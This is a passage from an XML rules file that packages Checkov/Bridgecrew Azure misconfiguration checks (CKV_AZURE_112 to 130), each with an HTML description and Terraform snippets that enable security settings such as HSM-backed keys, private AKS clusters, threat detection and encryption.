</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-enables-purge-protection' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-key-vault-enables-purge-protection</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-enables-purge-protection' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_112</key>
    <name>Ensure key vault key is backed by HSM</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="key-vault-key-is-not-backed-by-hsm"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-key-vault-key-is-not-backed-by-hsm"></div>Key vault key is not backed by HSM</div><a aria-label="Skip link to Key vault key is not backed by HSM" class="heading-anchor-icon fa fa-anchor" href="#key-vault-key-is-not-backed-by-hsm"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>For added assurance, when you use Azure Key Vault, you can import or generate keys in hardware security modules (HSMs) that never leave the HSM boundary. This scenario is often referred to as bring your own key, or BYOK. Azure Key Vault uses nCipher nShield family of HSMs (FIPS 140-2 Level 2 validated) to protect your keys.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_key_vault_key</li>
<li><strong>Argument:</strong> key_type - (Required) Specifies the Key Type to use for this Key Vault Key. Possible values are EC (Elliptic Curve), EC-HSM, Oct (Octet), RSA and RSA-HSM. Changing this forces a new resource to be created.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_key_vault_key" "generated" {
  ...
  key_type     = "RSA"
  ]
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-key-is-backed-by-hsm' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-key-vault-key-is-backed-by-hsm</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-key-is-backed-by-hsm' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_113</key>
    <name>Ensure SQL server disables public network access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="sql-server-is-enabled-for-public-network-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sql-server-is-enabled-for-public-network-access"></div>SQL Server is enabled for public network access</div><a aria-label="Skip link to SQL Server is enabled for public network access" class="heading-anchor-icon fa fa-anchor" href="#sql-server-is-enabled-for-public-network-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_mssql_server</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mssql_server" "example" {
              ...
 +            public_network_access_enabled = false
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-sql-server-disables-public-network-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-sql-server-disables-public-network-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-sql-server-disables-public-network-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_114</key>
    <name>Ensure key vault secrets have content_type set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="key-vault-secrets-do-not-have-content_type-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-key-vault-secrets-do-not-have-content-type-set"></div>Key vault secrets do not have content_type set</div><a aria-label="Skip link to Key vault secrets do not have content_type set" class="heading-anchor-icon fa fa-anchor" href="#key-vault-secrets-do-not-have-content_type-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Key Vault is a service for Secrets management to securely store and control access to tokens, passwords, certificates, API keys, and other secrets.<br/>
A content type tag helps identify whether a secret is a password, connection string, etc. Different secrets have different rotation requirements. Content type tag should be set on secrets.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_key_vault</li>
<li><strong>Argument:</strong> content_type - (Optional) Specifies the content type for the Key Vault Secret.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_key_vault" "example" {
  name                       = "examplekeyvault"
  location                   = azurerm_resource_group.example.location
  resource_group_name        = azurerm_resource_group.example.name
  tenant_id                  = data.azurerm_client_config.current.tenant_id
  sku_name                   = "premium"
  soft_delete_retention_days = 7
  + content_type = "text/plain"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-secrets-have-content_type-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-key-vault-secrets-have-content_type-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-secrets-have-content_type-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_115</key>
    <name>Ensure AKS enables private clusters</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aks-is-not-enabled-for-private-clusters"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aks-is-not-enabled-for-private-clusters"></div>AKS is not enabled for private clusters</div><a aria-label="Skip link to AKS is not enabled for private clusters" class="heading-anchor-icon fa fa-anchor" href="#aks-is-not-enabled-for-private-clusters"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable the private cluster feature for your Azure Kubernetes Service cluster to ensure network traffic between your API server and your node pools remains on the private network only. This is a common requirement in many regulatory and industry compliance standards.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_kubernetes_cluster</li>
<li><strong>Argument:</strong> private_cluster_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_kubernetes_cluster" "example" {
                  ...
  +               private_cluster_enabled = true
                  
                }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-aks-enables-private-clusters' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-aks-enables-private-clusters</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-aks-enables-private-clusters' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_116</key>
    <name>Ensure AKS uses Azure policies add-on</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aks-does-not-use-azure-policies-add-on"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aks-does-not-use-azure-policies-add-on"></div>AKS does not use Azure policies add-on</div><a aria-label="Skip link to AKS does not use Azure policies add-on" class="heading-anchor-icon fa fa-anchor" href="#aks-does-not-use-azure-policies-add-on"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Policy Add-on for Kubernetes service (AKS) extends Gatekeeper v3, an admission controller webhook for Open Policy Agent (OPA), to apply at-scale enforcements and safeguards on your clusters in a centralized, consistent manner.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_kubernetes_cluster</li>
<li><strong>Argument:</strong> addon_profile.azure_policy.enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_kubernetes_cluster" "example" {
                  ...
+                  addon_profile {
+                    azure_policy {
+                      enabled = true
                    }
                  }         
                }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-aks-uses-azure-policies-add-on' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-aks-uses-azure-policies-add-on</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-aks-uses-azure-policies-add-on' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_117</key>
    <name>Ensure AKS uses disk encryption set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aks-does-not-use-disk-encryption-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aks-does-not-use-disk-encryption-set"></div>AKS does not use disk encryption set</div><a aria-label="Skip link to AKS does not use disk encryption set" class="heading-anchor-icon fa fa-anchor" href="#aks-does-not-use-disk-encryption-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_kubernetes_cluster</li>
<li><strong>Argument:</strong> disk_encryption_set_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_kubernetes_cluster" "example" {
              ...
 +            disk_encryption_set_id = "someId"
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-aks-uses-disk-encryption-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-aks-uses-disk-encryption-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-aks-uses-disk-encryption-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_118</key>
    <name>Ensure Azure virtual machine NIC has IP forwarding disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-virtual-machine-nic-has-ip-forwarding-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-virtual-machine-nic-has-ip-forwarding-enabled"></div>Azure virtual machine NIC has IP forwarding enabled</div><a aria-label="Skip link to Azure virtual machine NIC has IP forwarding enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-virtual-machine-nic-has-ip-forwarding-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong>azurerm_network_interface</li>
<li><strong>Argument:</strong> enable_ip_forwarding</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_network_interface" "example" {
                  ...
 +                enable_ip_forwarding = false
                }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-network-interfaces-disable-ip-forwarding' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-network-interfaces-disable-ip-forwarding</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-network-interfaces-disable-ip-forwarding' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_127</key>
    <name>Ensure My SQL server enables Threat Detection policy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="my-sql-server-does-not-enable-threat-detection-policy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-my-sql-server-does-not-enable-threat-detection-policy"></div>My SQL server does not enable Threat Detection policy</div><a aria-label="Skip link to My SQL server does not enable Threat Detection policy" class="heading-anchor-icon fa fa-anchor" href="#my-sql-server-does-not-enable-threat-detection-policy"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable Advanced Threat Detection on your non-Basic tier Azure database for MySQL servers to detect anomalous activities indicating unusual and potentially harmful attempts to access or exploit databases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_mysql_server</li>
<li><strong>Argument:</strong> threat_detection_policy.enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mysql_server" "example" {
              ... 
+             threat_detection_policy {
+                 enabled = true
              }
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-my-sql-server-enables-threat-detection-policy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-my-sql-server-enables-threat-detection-policy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-my-sql-server-enables-threat-detection-policy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_128</key>
    <name>Ensure PostgreSQL server enables Threat Detection policy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="postgresql-server-does-not-enable-threat-detection-policy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-postgre-sql-server-does-not-enable-threat-detection-policy"></div>PostgreSQL server does not enable Threat Detection policy</div><a aria-label="Skip link to PostgreSQL server does not enable Threat Detection policy" class="heading-anchor-icon fa fa-anchor" href="#postgresql-server-does-not-enable-threat-detection-policy"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable Advanced Threat Detection on your non-Basic tier Azure database for PostgreSQL servers to detect anomalous activities indicating unusual and potentially harmful attempts to access or exploit databases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_postgresql_server</li>
<li><strong>Argument:</strong>threat_detection_policy.enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_postgresql_server" "example" {
              ...
+             threat_detection_policy {
+                 enabled = true
              }
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-threat-detection-policy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-threat-detection-policy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-threat-detection-policy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_129</key>
    <name>Ensure MariaDB server enables geo-redundant backups</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mariadb-server-does-not-enable-geo-redundant-backups"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-maria-db-server-does-not-enable-geo-redundant-backups"></div>MariaDB server does not enable geo-redundant backups</div><a aria-label="Skip link to MariaDB server does not enable geo-redundant backups" class="heading-anchor-icon fa fa-anchor" href="#mariadb-server-does-not-enable-geo-redundant-backups"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that your Microsoft Azure MariaDB database servers have geo-redundant backups enabled, to allow you to restore your MariaDB servers to a different Azure region in the event of a regional outage or a disaster.</p>
<p>Geo-restore is the default recovery option when your MariaDB database server is unavailable because of a large-scale incident, such as a natural disaster, occurs in the region where the database server is hosted. .During geo-restore, the MariaDB server configuration can be changed. These configuration changes include compute generation, vCore, backup retention period and backup redundancy options.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-console"></div>In Azure console</div><a aria-label="Skip link to In Azure console" class="heading-anchor-icon fa fa-anchor" href="#in-azure-console"></a></h2>
<ol>
<li>Sign in to <strong>Azure Management Console</strong>.</li>
<li>Navigate to <strong>All resource</strong>s blade at <a href="https://portal.azure.com/#blade/HubsExtension/BrowseAll" target="_self">https://portal.azure.com/#blade/HubsExtension/BrowseAll</a> to access all your Microsoft Azure resources.</li>
<li>From the Type filter box, select Azure Database for MariaDB server to list the MariaDB servers provisioned within your Azure account.</li>
<li>Click on the name of the MariaDB database server that you want to examine.</li>
<li>In the navigation panel, under Settings, select Pricing tier to access the pricing tier settings available for the selected MariaDB server.</li>
<li>On the Pricing tier page, in the Backup Redundancy Options section, check the backup redundancy tier configured for the database server. If the selected tier is Locally Redundant, the data can be recovered from within the current region only, therefore the Geo-Redundant backup feature is not enabled for the selected Microsoft Azure MariaDB database server.</li>
<li>Repeat steps no. 4 &#8211; 6 for each MariaDB database server available in the current Azure subscription.</li>
<li>Repeat steps no. 3 &#8211; 7 for each subscription created in your Microsoft Azure cloud account.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_mariadb_server</li>
<li><strong>Argument:</strong> geo_redundant_backup_enabled </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mariadb_server" "example" {
            ...
+           geo_redundant_backup_enabled  = true
        }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-mariadb-server-enables-geo-redundant-backups' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-mariadb-server-enables-geo-redundant-backups</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-mariadb-server-enables-geo-redundant-backups' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_130</key>
    <name>Ensure PostgreSQL server enables infrastructure encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="postgresql-server-does-not-enable-infrastructure-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-postgre-sql-server-does-not-enable-infrastructure-encryption"></div>PostgreSQL server does not enable infrastructure encryption</div><a aria-label="Skip link to PostgreSQL server does not enable infrastructure encryption" class="heading-anchor-icon fa fa-anchor" href="#postgresql-server-does-not-enable-infrastructure-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable infrastructure encryption for Azure Database for PostgreSQL servers to have higher level of assurance that the data is secure. When infrastructure encryption is enabled, the data at rest is encrypted twice using FIPS 140-2 compliant Microsoft managed keys.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
